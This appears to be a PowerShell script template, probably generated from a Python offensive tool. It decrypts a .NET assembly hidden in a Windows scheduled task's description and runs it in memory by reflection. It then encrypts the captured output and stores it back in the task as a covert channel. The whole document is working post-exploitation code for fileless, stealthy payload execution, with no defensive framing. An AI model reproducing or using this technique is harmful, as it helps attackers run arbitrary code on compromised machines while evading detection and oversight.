$encryptionKey = [System.Convert]::FromBase64String("{key_b64}")
{common_ps}
try {{
    $task = Get-ScheduledTask -TaskName "{taskname}" -TaskPath \;
    $decryptedDescription = Decrypt-Data $encryptionKey $task.Description
    $pass_args = Decrypt-Data $encryptionKey "REPLACE_ARGS"
    $args = $pass_args -split ' '
    $assembly = [System.Reflection.Assembly]::Load([System.Convert]::FromBase64String($decryptedDescription))
    $entryPoint = $assembly.EntryPoint
    if ($entryPoint -ne $null) {{
        $consoleOutput = [System.IO.MemoryStream]::new()
        $streamWriter = New-Object System.IO.StreamWriter($consoleOutput)
        $oldOut = [Console]::Out
        [Console]::SetOut($streamWriter)

        [string[]]$ARGS_NAME = @($args)
        $null = $entryPoint.Invoke($null, [object[]](,$ARGS_NAME))

        $streamWriter.Flush()
        [Console]::SetOut($oldOut)
        $consoleOutput.Position = 0
        $streamReader = New-Object System.IO.StreamReader($consoleOutput)
        $executionResult = $streamReader.ReadToEnd()
        # Cleanup
        $streamReader.Dispose()
        $streamWriter.Dispose()
        $consoleOutput.Dispose()
        $encryptedResult = Encrypt-Data $encryptionKey $executionResult
    }} else {{
        Write-Host "No entry point found in assembly."
    }}    
}} catch {{
    $executionResult = $_.Exception.Message
}}
$task.Description = $encryptedResult
Set-ScheduledTask $task
[Environment]::Exit(0)